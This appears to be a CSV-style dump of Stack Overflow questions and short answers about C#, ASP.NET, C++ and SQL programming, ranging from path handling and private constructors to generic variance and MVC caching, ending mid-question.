<p>with the full directory path returns the last part of the path which is a directory name. <code>GetDirectoryName</code> returns the whole path of parent directory which is unwanted.</p>

<p>If you have a file name and you just want the name of the parent directory:</p>

<pre><code>var directoryFullPath = Path.GetDirectoryName(@""C:\DTDs\mydtd.dtd"");  // C:\DTDs
var directoryName = Path.GetFileName(directoryFullPath);  // DTDs
</code></pre>
"
"<p>If you have an immutable type like this:</p>

<pre><code>struct Point3
{

}
</code></pre>

<p>and a member inside like origin:</p>

<pre><code>public static const Point3 Origin = new Point3 (0,0,0);
</code></pre>

<p>should you use:</p>

<pre><code>new Point3 (0,0,0)
</code></pre>

<p>?</p>

<p>It seems to me that since the type can not be changed, why have many origins that are essentially the same thing? Like we never change 0, right?</p>

<p>How to achieve the same thing for immutable types?</p>
","33708","","<pre><code>public static readonly Point3 Origin = new Point3(0,0,0);
</code></pre>
"
"<p>I have recently purchased a laptop to do some offsite development, as well some of my own work during commuting.</p>

<p>I am used to developing on XP, but the laptop was bundled with a version of Vista Home Premium (I had no say in this unfortunately). I tried to install XP on it, but it failed as the XP install doesn't come with SATA drivers.</p>

<p>I am aware you can create a 'slipstreamed' version of the XP Setup with nlite, and will probably do so, though from my research this has been problematic for many people, missing drivers, blue screening etc.</p>

<p>I am trying to decide whether or not to pursue this option, or just accept my Vista install, so I want to understand what I will lose in way of development, such as IIS restrictions (is Cassini an acceptable substitue?). What versions of SQL, if any would I be restricted to. What else should I be aware of in terms of .NET development, or, for what I need, is Home Premium not a valid option?</p>

<p><strong>EDIT</strong></p>

<p>To answer why I want to go back to XP installation, I guess negative Vista press, and my innate snobbery against the word 'Home' in the name of my operating system :). </p>

<p>I am more than happy to stay on it, though, if I am not hobbled as a developer, as I would much rather get cracking with what I've got than suffer the pain of trying to hack a working XP out of a currently good system.</p>

<p>Thanks for your answers, and more than happy to hear more</p>
","33708","","<p>It's a perfect development platform. It has IIS. You can setup SQL Server 2005 SP2 and SQL Server 2008 without any problems. I don't see how it's not better than XP.</p>
"
"<p>What is the need of private constructor in C#?
I got it as a question for a C# test.</p>
","33708","","<p>Whenever you want to prevent direct instantiation of a class from outside of it, you'll use a <code>private</code> constructor. For example, prior to C# 2.0 which introduced <code>static</code> classes, you used a <code>private</code> constructor to accomplish roughly the same thing:</p>

<pre><code>sealed class StaticClass {
     private StaticClass() {
     }
     public static void DoSomething() {
     }
}
</code></pre>
"
"<p>I have a Control that can overlay multiple C# user controls in my GUI. This control has a semi-transparent background in order to 'grey-out' portions of the GUI and the class looks somethink like this:</p>

<pre><code>public greyOutControl: UserControl
{
    // Usual stuff here

    protected overide OnPaint()
    {
        paintBackround();

        base.OnPaint();
    }
}
</code></pre>

<p>Currently the control sometimes gets caught in a loop and constantly re-draws the background, making the semi-transparent color appear less and less transparent.</p>

<p>My idea to combat this is the following (in broad terms):</p>

<p>1) Determine what controls the greyOutControl is on top of
2) call Refresh() on those controls to update the display
3) continue drawing the greyOutControl.</p>

<p>My question is: How can I determine which controls the greyOutControl overlaps?, or is there a way that I can refresh only the part of the GUI that greyOutControl covers?</p>
","33708","","<p>I don't see a direct way of finding the overlapping controls. I think you might need to check the whole control tree to find out that. About refreshing, you can use <code>Control.Invalidate(Rectangle)</code> method to specify which part to refresh. </p>
"
"<p>In C# ASP.Net, I would like to create and save a text file to a server.  This will be happening daily (by a user action, not scheduled).</p>

<p>I would like the location to not be in the application path but in a separate folder (for this question, lets say the folder is off the root).  </p>

<p>I am new to this site and if this question is too ""open"", feel free to let me know.</p>

<p>Thanks for your assistance.</p>
","33708","","<p>I don't see any specific issue in doing so. You just need to make sure the user running ASP.NET is granted the required permissions to write to the output folder.</p>
"
"<p>When I do this:</p>

<pre><code>std::vector&lt;int&gt; hello;
</code></pre>

<p>Everything works great. However, when I make it a vector of references instead:</p>

<pre><code>std::vector&lt;int &amp;&gt; hello;
</code></pre>

<p>I get horrible errors like ""error C2528: 'pointer' : pointer to reference is illegal"".</p>

<p>I want to put a bunch of references to structs into a vector, so that I don't have to meddle with pointers. Why is vector throwing a tantrum about this? Is my only option to use a vector of pointers instead?</p>
","33708","","<p>You have to settle with pointers. As the compiler error says, internally, <code>vector</code> will want to have a variable of type <code>T*</code> which won't work if <code>T</code> is a reference.</p>
"
"<p>Does a method like this exist anywhere in the framework?</p>

<pre><code>public static void Swap&lt;T&gt;(ref T left, ref T right) {
    T temp;
    temp = left;
    left = right;
    right = temp;
}
</code></pre>

<p>If not, any reason why?</p>
","33708","","<p>No, the framework does not have such a method. Probably the reason is there's not much benefit to have it built-in and you could very easily (as you did) add it yourself. This also requires use of <code>ref</code> as parameter, which will greatly limit the use cases. For instance, you couldn't do this:</p>

<pre><code>List&lt;int&gt; test; 
// ...
Swap(ref test[0], ref test[1]); // won't work, it's an indexer, not an array
</code></pre>
"
"<p>Is it recommended to check the Page.IsPostBack in a user control Page_Load Event like</p>

<pre><code>    protected void Page_Load(object sender, EventArgs e)
    {

        if (!Page.IsPostBack)
        {


        }


    }
</code></pre>

<p>I am getting wierd results</p>

<p>Edit ~ Here is the thing. When the main form is loaded, I use Request.QueryString to get the customer id which I then place in a SESSION variable. </p>

<p>On the control Load event I read the SESSION variable to get the data for that customer. So, do I need to check PostBack at the control level?</p>

<p>Edit ~ Here is the load event of the control</p>

<pre><code>    protected void Page_Load(object sender, EventArgs e)
    {
        if (!Page.IsPostBack)
        {
            //Getting and storing the customer account number 
            if (string.IsNullOrEmpty((string)Session[""CustomerNumber""]))
            {
                Session[""CustomerNumber""] = cust.GetCustomerNumber(myHelper.GetCustomerIDFromQueryString());
                LoadProductData();
            }
        }

    }
</code></pre>

<p>Here is the myHelper Class</p>

<pre><code>static class myHelper
{
    public static Guid GetCustomerIDFromQueryString()
    {
        //Getting the GUID (used as customerid in CRM) from the URL request of the selected account.  
        return Sql.ToGuid(System.Web.HttpContext.Current.Request[""ID""]);
    }

}
</code></pre>

<p>}</p>
","33708","","<p>Just checking it for no reason? Absolutely not. If you should do something only on first load and not on subsequent post backs then it's the pattern that should be used.</p>
"
"<p>I have a the following methods in an MVC Controller which redirect to the login page when a user is not logged in.</p>

<pre><code>[Authorize]
public ActionResult Search() {
  return View();
}

[Authorize]
public ActionResult Edit() {
  return View();
}
</code></pre>

<p>Is there a quick/easy/standard way to redirect the second action to a different login page other than the page defined in the web.config file?</p>

<p>Or do I have to do something like</p>

<pre><code>public ActionResult Edit() {
  if (IsUserLoggedIn)
    return View();
  else 
     return ReturnRedirect(""/Login2"");
}
</code></pre>
","33708","","<p><code>Web.config</code> based forms authentication does not have such a functionality built-in (this applies to both WinForms and MVC). You have to handle it yourself (either through an HttpModule or ActionFilter, the method you mentioned or any other method)</p>
"
"<p>Is there a method to validate URLs in .Net, ASP.Net, or ASP.Net MVC?</p>
","33708","","<pre><code>static bool IsValidUri(string urlString) {
   try {
      new Uri(urlString);
      return true;
   } catch {
      return false;
   }
}
</code></pre>
"
"<p>The closest I could find to this question was this one: <a href=""http://stackoverflow.com/questions/26733/getting-all-types-that-implement-an-interface-with-c-3-5"">http://stackoverflow.com/questions/26733/getting-all-types-that-implement-an-interface-with-c-3-5</a></p>

<p>But that is for use in code, and to use it I'd have to change the code, recompile and run. I was wondering if there is a simpler way for me to just lookup all classes that implement a certain interface.</p>

<p>I seem to be faced with the question fairly often enough that I am seeking some easier/more generic way to find my answer. Most recently I wanted to find out what classes I could use that implement ISet, it didn't matter to me which class, just needed one to use to create an instance.</p>

<p>So I was wondering if there was any way to just find all classes that implement a given interface?</p>

<p>Thanks,
Jeff</p>
","33708","","<p>No there's not an easier way. I guess that way is pretty easy to do. It's just three lines. You can cache the results in a list or dictionary (in case you want to test it for a collection of interfaces) if you need to do it many times in a row.</p>

<p>In case you need just as a tool, <a href=""http://www.red-gate.com/products/reflector/"" rel=""nofollow"">Reflector</a> does it.</p>
"
"<p>This is code from an exercise:</p>

<pre><code>#include &lt;iostream&gt;
using namespace std;

int main() {
    int n = 13;
    int* ip = new int(n + 3);
    int* ip2 = ip;
    cout &lt;&lt; *ip &lt;&lt; endl;
    delete ip;
    cout &lt;&lt; *ip2 &lt;&lt; endl;
    cout &lt;&lt; ip &lt;&lt; tab &lt;&lt; ip2 &lt;&lt; endl;
}
</code></pre>

<p>When the space allocated to the int on the heap is deleted, I thought that dereferencing the pointer would give some sort of memory error. Instead, it returns 0.</p>

<p>Why is this?</p>
","33708","","<p>Dereferencing an invalid pointer leads to undefined results per spec. It's not guaranteed to fail. </p>

<p><em>Usually (CPU/OS/compiler/... dependent)</em>, the compiler doesn't really care about it at all. It just gives what's currently at that memory address. For example, in x86 architecture, you just see an error only when the address is in a memory page that's not mapped to your process (or your process doesn't have permission to access that), thus an exception will be thrown by the CPU (protection fault) which the OS would handle appropriately (and probably, making your process fail). A trick is sometimes used to make accessing the address <code>0</code> always cause an access violation: The OS sets the read/write bits of the first page of the address space in the page table to 0 so that any access to that page will always generate an exception.</p>
"
"<p>I'm having trouble placing the concepts and possiblities of the to be introduced F# language from Microsoft.</p>

<p><strong>Will F# be used just for declaring functions? Or will applications be written 'entirely' in F# by mixing F# together with normal C# or VB code?</strong></p>
","33708","","<p>Depending on the context, you might consider both.</p>

<p>You can use F# to build complete .NET applications or hook it up to other .NET languages. It can consume and expose libraries from/to other .NET languages. </p>
"
"<p>I've been looking into how programming languages work, and some of them have a so-called virtual machines. I understand that this is some form of emulation of the programming language within another programming language, and that it works like how a compiled language would be executed, with a stack. Did I get that right?</p>

<p>With the proviso that I did, what bamboozles me is that many non-compiled languages allow variables with ""liberal"" type systems. In Python for example, I can write this:</p>

<pre><code>x = ""Hello world!""
x = 2**1000
</code></pre>

<p>Strings and big integers are completely unrelated and occupy different amounts of space in memory, so how can this code even be represented in a stack-based environment? What exactly happens here? Is x pointed to a new place on the stack and the old string data left unreferenced? Do these languages not use a stack? If not, how do they represent variables internally?</p>
","33708","","<p>Probably, your question should be titled as ""How do <strong>dynamic languages</strong> work?."" </p>

<p>That's simple, they store the variable type information along with it in memory. And this is not only done in interpreted or JIT compiled languages but also natively-compiled languages such as Objective-C.</p>
"
"<p>The case:</p>

<p>There is a .net application calling unmanaged C code. Used method for this:</p>

<pre><code>public static class MiracleCreator
{
    [DllImport(""Library.dll"")]
    private static extern void RunUnmanaged(string fileName);

    public static void Run(string fileName)
    {
        RunUnmanaged(fileName);
    }
}
</code></pre>

<p>It is used in a Windows Forms application and the needed file name is obtained by OpenFileDialog. Code:</p>

<pre><code>if (openFileDialog.ShowDialog() == DialogResult.OK)
{
    MiracleCreator.Run(openFileDialog.FileName);
}
</code></pre>

<p>The problem:</p>

<p>After several executions of the code in the Windows Forms application the openFileDialog gets broken with exception: <em>""Attempted to read or write protected memory. This is often an indication that other memory is corrupt.""</em></p>

<p>In searching for solution:</p>

<p>Trying ""more reliable"" use of OpenFileDialog doesn't help. Like this solution (tried to give the link, but ""new users aren't allowed to add hyperlinks"" :) ):</p>

<pre><code>public class Invoker
{
    public OpenFileDialog InvokeDialog;
    private Thread InvokeThread;
    private DialogResult InvokeResult;

    public Invoker()
    {
        InvokeDialog = new OpenFileDialog();
        InvokeThread = new Thread(new ThreadStart(InvokeMethod));
        InvokeThread.SetApartmentState(ApartmentState.STA);
        InvokeResult = DialogResult.None;
    }

    public DialogResult Invoke()
    {
        InvokeThread.Start();
        InvokeThread.Join();
        return InvokeResult;
    }

    private void InvokeMethod()
    {
        InvokeResult = InvokeDialog.ShowDialog();
    }
}
</code></pre>

<p>Usage :</p>

<pre><code>        Invoker I = new Invoker();

        if (I.Invoke() == DialogResult.OK)
        {
            MessageBox.Show(I.InvokeDialog.FileName, ""Test Successful."");
        }
        else
        {
            MessageBox.Show(""Test Failed."");
        }
</code></pre>

<p>Questions:</p>

<p>Is the exception really caused by the unmanaged code? Could other possible problems be expected (breaking something different from the OpenFileDialog)? What is the better approach for this?</p>

<p>Thank you for every idea/solution.</p>
","33708","","<p>You should specify the appropriate <code>MarshalAs</code> attribute for the <code>string</code> parameter of the method declaration. Something like:</p>

<pre><code>[DllImport(""Library.dll"")]
private static extern void RunUnmanaged(
  [MarshalAs(UnmanagedType. ... )] string fileName);
</code></pre>
"
"<p>Let's say that I have a bunch of class instances that serve different purposes, so I want to be able to reference them directly by name:</p>

<pre><code>SomeObject aardvark = new SomeObject();
SomeObject llama = new SomeObject();
SomeObject tiger = new SomeObject();
SomeObject chicken = new SomeObject();
</code></pre>

<p>But then I also want an array of them for easy iteration:</p>

<pre><code>SomeObject[] animals = {aardvark, llama, tiger, chicken};
</code></pre>

<p>My question is this.  What happens when I do this:</p>

<pre><code>llama = new SomeObject();
</code></pre>

<p>I'll be creating a totally new llama object.  How does this affect my animals array?  Will it be referencing the NEW llama object, or somehow still referencing a copy of the old one?</p>

<p>I know Java is ""pass by value"", but I still get confused by stuff like this.  When I use the NEW keyword, does the ""value"" of that object reference change?  Thanks!</p>
","33708","","<p>No it won't. It creates a new instance and the value of the expression will be a reference to the created instance. The assignment will just set the variable to the new object. It won't affect any other references to the previous object.</p>

<p>Basically, you could think of it as two separate operations:</p>

<pre><code>SomeObject newInstance = new SomeObject();
oldInstance = newInstance;
</code></pre>

<p><code>oldInstance</code> holds just a reference and the assignment will change just that.</p>

<p>It's completely unrelated to pass-by-value. You are not passing any object anywhere.</p>
"
"<p>I saw an article in a blog about opening .doc files from External Tools in Visual Studio 2008 (C# language spec in this case).</p>

<p>I can't find this article anymore. Does anyone know how to do this (and also for .pdfs)? There doesn't seem to be much guidance on doing this in VS.</p>

<p>Thanks</p>
","33708","","<p>It's pretty easy to do. Go to ""Tools <code>-&gt;</code> External tools...."" Set the command to the path of MSWord (or PDF reader of your choice) and set arguments to the path of the document.</p>

<p>For example, in my PC:</p>

<ul>
<li>Title: C# Language Specification</li>
<li>Command: <code>C:\Program Files (x86)\Microsoft Office\Office12\WINWORD.EXE</code></li>
<li>Arguments: <code>""C:\Program Files (x86)\Microsoft Visual Studio 9.0\VC#\Specifications\1033\CSharp Language Specification.doc""</code></li>
</ul>

<p>Make sure you put the argument path in quotes if it contains characters like space, as it needs to be treated as a single argument to the command.</p>
"
"<p>This seems to be pretty straight forward. I need to send email from some ASP.NET applications. I need to do this consistently without strange errors and without CPU utilization going through the roof. I'm not talking about mass emailing, just occasional emails.</p>

<p>System.Net.Mail <em>appears</em> to be horribly broken. The SmtpClient does not issue the Quit command (it may be because Microsoft(R) is not interested in following specifications), therefore a connection is left open. Therefore, if someone tries to email before that connection <strong>finally</strong> closes, you can get errors from the SMTP Server about too many connections open. This is a bug that Microsoft(R) is completely uninterested in fixing. See here:</p>

<p><a href=""http://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=146711"">http://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=146711</a></p>

<p>Also, if you look around some suggest to use this code to solve this problem:</p>

<pre><code>smtpClient.ServicePoint.MaxIdleTime = 1;
smtpClient.ServicePoint.ConnectionLimit = 1;
</code></pre>

<p>Ok, yes that does ""solve"" the problem of connections being left open. However, this consistently, try it on a server if you like, causes the CPU on which the process (in this case w3wp.exe) is running to jump and remain at 100% until your application pool is recycled. For whatever reason, the thread that runs mscorwks.dll!CreateApplicationContext is the culprit.</p>

<p>This has the very nice side effect that if you are running on a web host that frowns on sustained 100% CPU usage, you will get your application pool disabled. So this is not as trivial as some suggest. </p>

<p>So my question is what to do? What I need to do is so simple; however getting those ""too many connections open"" errors is not acceptable and nor is the 100% CPU usage. I don't want to purchase a third party component, not because I'm cheap, but I buy enough components  and MSDN subscription that it seems crazy to have to shell out $100-$300 for simple SMTP functionality.</p>

<p>I read that setting the MaxIdleTime higher can help but I'm skeptical of that. I don't want to risk my app pool being disabled just because Microsoft doesn't want to follow the SMTP specification.</p>

<p><strong>Edit:</strong>  I looked at quiksoft.com components, however it does not support SMTP authentication and it costs $500. There's got to be a solution to this problem. </p>
","33708","","<p>While I haven't had any specific problems with <code>System.Net.Mail</code> so far, you can always use the older <a href=""http://msdn.microsoft.com/en-us/library/system.web.mail.smtpmail.aspx"" rel=""nofollow""><code>System.Web.Mail</code></a> API which is a wrapper for CDOSYS.</p>
"
"<p>What is the cheapest way to deploy or host an ASP.Net MVC application? Any shared hostings? This is for a little toy application which I'll pay from my own pocket. Nothing entreprisy, the cheaper the better.</p>
","33708","","<p>Any shared hosting that supports ASP.NET 3.5 should be capable of hosting your ASP.NET MVC apps. You just need to deploy these DLLs in <code>bin</code> directory:</p>

<ul>
<li>System.Web.Mvc.dll</li>
</ul>

<p>In case it's not on .NET 3.5 <strong>SP1</strong>:</p>

<ul>
<li>System.Web.Abstractions.dll</li>
<li>System.Web.Routing.dll</li>
</ul>

<p>Of course, to be able to use extensionless URLs, your host should support IIS7 Integrated mode or allow you to add a wildcard map (or you can email them and ask them to add it for you). Otherwise, nothing prevents you from using <code>.aspx</code> URLs if they didn't agree. Just change the routing table entries to something like:</p>

<pre><code>routes.MapRoute(""Default"", ""{controller}.aspx/{action}/{id}"", 
                           new { action = ""Index"", id = """" });
</code></pre>
"
"<p>I am very new to development and I have a question about my user controls. </p>

<p>I have a panel2 inside a split container that has several user controls loaded into it. Panel 1 has an exit button and I want to call one of the sub routines that is in one of the user controls loaded into Panel2.</p>

<pre><code>Private Sub btnExit_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnExit.Click
        Dim dialogMessage As DialogResult
        Dim a As New ucTimeTracker

    dialogMessage = MessageBox.Show(""Are you sure you want to exit?"", ""Exit Ready Office Assistant?"", _
    MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question)

    If dialogMessage = Windows.Forms.DialogResult.Yes Then

        ucTimeTracker.autoWriteFileOnExit()
        Me.Close()

    Else
        Return
    End If

End Sub
</code></pre>

<p>This line is giving me trouble ""ucTimeTracker.autoWriteFileOnExit()"" I am getting (reference to non-shared member requires an object reference).</p>

<p>I'm just not sure what I'm missing. </p>

<p>Basically I want the exit button on frmMain.SplitContainer.Panel1 to call autoWriteFileOnExit() on the user control named ucTimeTracker that is loaded into splitContainer.Panel2</p>
","33708","","<p>It seems that you are using the user control class name <code>ucTimeTracker</code> instead of the instance name. Click on the user control in design view and in the properties view, there's a ""Name"" property. use the value in the name property (probably <code>ucTimeTracker1</code>) instead:</p>

<pre><code>  ucTimeTracker1.autoWriteFileOnExit()
</code></pre>
"
"<p>I am pretty new to MVC and hope that I am approaching this the correct way.  Any input or advice would be great.</p>

<p>I would like to have a thumbnail view of an image load normally and when a user clicks on the image, the dynamic picture loads using the colorbox jquery plugin.</p>

<p>The problem is when you click on the smaller image, the dynamic image becomes the entire page.  I realize its because of where the href is pointing to, but I need some pointers as to a correct way to accomplish this.</p>

<pre><code> &lt;div id=""gallery""&gt;

    &lt;% For Each item In Model%&gt;

    &lt;ul&gt;
        &lt;li&gt;
            &lt;a href=""&lt;%=Url.Action(""CreateWM"", ""Image"", New With {.id = item.ImageID })%&gt;"" title=""Please work"" rel=""Test""&gt;
                &lt;img src=""&lt;%=Url.Action(""Create"", ""Image"", New With {.id = item.ImageID })%&gt;"" width=""300"" height=""300"" alt=""Woot"" /&gt;
            &lt;/a&gt;
        &lt;/li&gt;
    &lt;/ul&gt;

    &lt;% Next%&gt;

&lt;/div&gt;
</code></pre>

<p>In case someone needs it, this is the ImageController.  The ImageActionResult is taking the memory stream and returning the image</p>

<pre><code>Public Class ImageController
   Inherits System.Web.Mvc.Controller

    Public Function CreateWM(ByVal id As String) As ImageActionResult

        Using db As New DataClasses1DataContext
            Dim ms As New MemoryStream(db.MyImages.Single(Function(x) x.ImageID = id).ImageData.ToArray())
            Return New ImageActionResult(ms, ""hey.jpg"", True)
        End Using

    End Function

    Public Function Create(ByVal id As String) As ImageActionResult

        Using db As New DataClasses1DataContext
            Dim ms As New MemoryStream(db.MyImages.Single(Function(x) x.ImageID = id).ImageData.ToArray())
            Return New ImageActionResult(ms, ""hey.jpg"", False)
        End Using

    End Function

End Class
</code></pre>

<p>Thanks</p>
","33708","","<p>You need to manipulate the URL of the <strong>image element</strong> using client side javascript, something like:</p>

<pre><code>&lt;a href=""#"" onclick=""$('#myImg')[0].src='&lt;%=Url.Action(""CreateWM"", ""Image"", New With {.id = item.ImageID })%&gt;'"" title=""Please work"" rel=""Test""&gt;
     &lt;img id=""myImg"" src=""&lt;%=Url.Action(""Create"", ""Image"", New With {.id = item.ImageID })%&gt;"" width=""300"" height=""300"" alt=""Woot"" /&gt;
&lt;/a&gt;
</code></pre>
"
"<p>I'm somewhat new to .NET but not new to programming, and I'm somewhat puzzled at the trend and excitement about disassembling compiled .NET code.  It seems pointless.</p>

<p>The high-level ease of use of .NET is the reason I use it.  I've written C and real (hardware processor) assembly in environments with limited resources.  That was the reason to spend the effort on so many meticulous details, for efficiency.  Up in .NET land, it kind of defeats the purpose of having a high-level object-oriented language if you waste time diving down into the most cryptic details of the implementation.  In the course of working with .NET, I have debugged the usual performance issues an odd race conditions, and I've done it all by reading my own source code, never once having any thought as to what intermediate language the compiler is generating.  For example, it's pretty obvious that a for(;;) loop is going to be faster than a foreach() on an array, considering that foreach() is going to use an enumeration <em>object</em> with a method call to advance to each next time instead of a simple increment of a variable, and this is easy to prove with a tight loop run a few million times (no disassembly required).</p>

<p>What really makes disassembling IL silly is the fact that's it's not <em>real</em> machine code.  It's virtual machine code.  I've heard some people actually like to move instructions around to optimize it.  Are you kidding me?  Just-in-time compiled virtual machine code can't even do a simple tight for(;;) loop at the speed of natively compiled code.  If you want to squeeze every last cycle out of your processor, then use C/C++ and spend time learning real assembly.  That way the time you spend understanding lots of low-level details will actually be worthwhile.</p>

<p>So, other than having too much time on their hands, why do people disassemble .NET (CLR) binaries?</p>
","33708","","<p>To understand how the underlying system is implemented, understand what's the equivalent of a high level code in IL, circumvent licensing...</p>
"
"<p>What is associativity (for an operator) and why is it important?</p>

<p><strong>Updated:</strong> operator associativity</p>
","33708","","<p>I assume you mean operator associativity...</p>

<p>It's the order of binding of operands to an operator. Basically:</p>

<p>a - b + c</p>

<p>might be evaluated as (assuming - and + have the same precedence):</p>

<p>((a - b) + c)  or,<br />
(a - (b + c))</p>

<p>If operators are left associative (bind immediately to the left operand), it'll be evaluated as the first. If they are right associative, it'll be evaluated as the second.</p>
"
"<p>I'm a noob and wrote a whole program without knowing the easy way to find an element in an array...</p>

<pre><code>my_array.indexOf(""find this value"");
</code></pre>

<p>Is indexOf a lot better than storing how many elements are in an array, and looping through the array until you find the element you want? I could have simplified my code alot. </p>

<p>I tried to make my lookups constant time by using multiple arrays, and storing the keys. It makes insertions/deletes slow because I have to update the keys though.</p>

<p>Should I have just used indexOf?</p>

<p>Thanks</p>
","33708","","<p>You could use a <a href=""http://weblogs.asp.net/ssadasivuni/archive/2003/09/17/27902.aspx"" rel=""nofollow"">hash table implementation in javascript</a> to map values to array indices.</p>
"
"<p>When I try to run Unit Tests (mstest) I run into this issue.<br />
The line of code:  </p>

<pre><code>_mainCnStr = System.Configuration.ConfigurationManager.
               ConnectionStrings[""main""].ConnectionString;
</code></pre>

<p>Comes back as a null reference</p>

<p>It doesn't do this in the main UI project when I run it. What is the right method to get this connection string setting seen by the Unit Test project? I tried embedded as a resource. I tried Copy Always. What is the right combination of settings that will fix this for me?</p>
","33708","","<p>You should add an <code>app.config</code> to the unit test project. It won't automatically use the settings in UI application's <code>app.config</code>.</p>
"
"<p>Does anybody know of a way I can calculate very large integers in c#</p>

<p>I am trying to calculate the factorial of numbers e.g.</p>

<p>5! = 5*4*3*2*1 = 120</p>

<p>with small numbers this is not a problem but trying to calculate the factorial of the bigest value of a unsigned int which is 4,294,967,295 it doesn't seem possible.</p>

<p>I have looked into the BigInteger class but it doesn't seem to do what I need</p>

<p>any help would be greatly appreciated</p>
","33708","","<p>In case you have J# redist installed, an alternative way would be using <code>java.math.BigInteger</code> by adding a reference to the <code>vjslib</code> assembly.</p>
"
"<p>I am using my own extension methods of IQueryable&lt;> to create chainable queries such as FindAll().FindInZip(12345).NameStartsWith(""XYZ"").OrderByHowIWantIt() etc. which then on deferred execution creates a single query based on my extension methods chain.</p>

<p>The problem with this though, is that all Where's in the extension chain (FindXYZ, FindInZip etc.) will always combine as AND which means I can't do something like this:</p>

<p>FindAll().FirstNameStartsWith(""X"").OrLastNameStartsWith(""Z"") because I don't know how I can inject the OR in a separate Where method.</p>

<p>Any idea how I can solve this?</p>

<p><hr /></p>

<p>additional;
So far I understand how to chain expressions as Or if I wrap them (e.g. CompileAsOr(FirstNameStartsWith(""A"").LastNameStartsWith(""Z"").OrderBy(..))</p>

<p>What I'm trying to do though is slightly more complicated (and PredicateBuilder doesn't help here..) in that I want a later IQueryable to basically access the Where conditions that were established prior without having to wrap them to create the Or between them.</p>

<p>As each extension method returns IQueryable&lt;> I understand that it should have the knowledge about the current status of query conditions somewhere, which leads me to believe that there should be some automated way or creating an Or across all prior Where conditions without having to wrap what you want Or'd.</p>
","33708","","<p>Use <a href=""http://www.albahari.com/nutshell/predicatebuilder.aspx""><code>PredicateBuilder&lt;T&gt;</code></a>. It's probably what you want.</p>
"
"<p><code>IEnumerable&lt;T&gt;</code>, <code>IComparable&lt;T&gt;</code> and a few more are now type-variant. <code>IList&lt;T&gt;</code>, <code>ICollection&lt;T&gt;</code> and many others aren't. Why?</p>
","33708","","<p>.NET Framework 4.0 introduces <strong>safe</strong> co/contra-variance. <code>IList&lt;T&gt;</code> and <code>ICollection&lt;T&gt;</code> have <code>T</code> both in input and output positions while <code>IEnumerable&lt;T&gt;</code> has <code>T</code> <em>only in output positions</em> and <code>IComparable&lt;T&gt;</code> has <code>T</code> <em>only in input positions</em>.</p>

<p>Assume <code>IList&lt;T&gt;</code> supported type variance: </p>

<pre><code>static void FailingMethod(IList&lt;object&gt; list) {
    list[0] = 5;
}

static void Test() {
    var a = new List&lt;string&gt;();
    a[0] = ""hello"";
    FailingMethod(a); // if it was variant, this method call would be unsafe
}
</code></pre>
"
"<p>How do I know the the complete virtual path that my application is currently hosted? For example:</p>

<pre><code>http://www.mysite.com/myApp
</code></pre>

<p>or</p>

<pre><code>http://www.mysite.com/myApp/mySubApp
</code></pre>

<p>I know the application path of HttpRequest but it only returns the folder name that my application is currently hosted, but how do I get the initial part?</p>
","33708","","<p>The domain name part of the path is not really a property of the application itself, but depends on the requesting URL. You might be able to reach a single Web site from many different host names. To get the domain name associated with the <strong>current request</strong>, along with the virtual path of the current application, you could do:</p>

<pre><code>Request.Url.GetLeftPart(UriPartial.Authority) + Request.ApplicationPath
</code></pre>

<p>Technically, an ""application"" is a virtual directory defined in IIS and <code>Request.ApplicationPath</code> returns exactly that. If you want to get the folder in which the current <strong>request</strong> is handled, you can do this:</p>

<pre><code>VirtualPathUtility.GetDirectory(Request.Path)
</code></pre>

<p>ASP.NET has no idea how to distinguish your sub-application from a bigger application if it's not defined as a virtual directory in IIS. Without registering in IIS, it just sees the whole thing as a single app.</p>
"
"<p>Are there any best practices that cover the places that ASP.NET MVC models should be defined?</p>

<p>A new ASP.NET MVC project has a nice neat Models folder for them to go in, but in a production environment they can come from other places:</p>

<ul>
<li>Third party class libraries</li>
<li>WCF services</li>
</ul>

<p>Is it acceptable for a strongly-typed view to use a class defined in such a location?</p>
","33708","","<p>I don't know what you exactly mean by putting models in WCF services. If you mean using WCF services that expose the model object you need, that would work. </p>

<p>Regarding separate class libraries to hold your models, views and controllers, I think that's a pretty common approach and works pretty well. In fact, I believe this is really a requirement when the size and complexity of your application grows. It's a kind of <em>physical separation</em> of the distinct logical components in an MVC app.</p>
"
"<p>In webforms I would do something like this in the OnInit method, but where (and how) could I do the same type of thing using MVC?</p>

<pre><code>Response.Cache.SetCacheability(HttpCacheability.NoCache)
</code></pre>
","33708","","<p>You can do the exact same thing in MVC too in the controller action (by writing the same line of code) or adding an attribute (which is preferred):</p>

<pre><code>[OutputCache(Location=System.Web.UI.OutputCacheLocation.None)]
public ActionResult Index() {
   // ...
}
</code></pre>
"
"<p>I have a class that looks like this:</p>

<pre><code>public class Person
{
  public string Name { get; set; }

  public string Thing() { 
    ...
  }

  ...

}
</code></pre>

<p>If I have an <code>IList&lt;Person&gt;</code> that I'm using as a data source for a DataList control, and the DataList looks like this:</p>

<pre><code>&lt;asp:DataList runat=""server"" RepeatColumns=""1"" ID=""Profiles""&gt;
    &lt;ItemTemplate&gt;                                  
        &lt;%#Eval(""Name"") %&gt;          
    &lt;/ItemTemplate&gt;
&lt;/asp:DataList&gt;
</code></pre>

<p>How do I replace the <code>Name</code> property of the data source with a call to the data source object's <code>Thing()</code> method?</p>
","33708","","<pre><code>&lt;%#((Person)Container.DataItem).Thing()%&gt;
</code></pre>
"
"<p>Basically what i want in my stored procedure is to return a list of tables, store this list in a variable; i need to go through every item in my list to recursively call this storedprocedure. In the end i need an overall listOfTables built up of this recursion.
Any help would be most appreciated</p>
","33708","","<p>You should take a look at <a href=""http://msdn.microsoft.com/en-us/library/ms186243.aspx"" rel=""nofollow"">Common Table Expressions</a> in case you're on SQL2005 or higher (not sure if they can help in your specific situation but an important alternative to most recursive queries) . Recursive procedures cannot nest more than 32 levels deep and are not very elegant.</p>
"
"<p>I have a list of rather meaningless codes that I'm processing with a VB.NET Windows application. For the business logic I'm writing to process those codes, I'd like to use meaningful constants (like <code>ServiceNotCovered</code> or <code>MemberNotEligible</code>) instead of the original codes (like <code>""SNCV""</code> and <code>""MNEL""</code>).</p>

<p>As far as I can tell, Enums can only map to numeric values, not to strings. So the best I've been able to come up with is a static class that exposes the constants as static readonly string fields that are internally set equal to the code values, as follows.</p>

<pre><code>Public Class MyClass

    private _reasonCode as String()
    Public Property ReasonCode() As String
        'Getter and Setter...
    End Property

    Public Class ReasonCodeEnum
        Private Sub New()
        End Sub
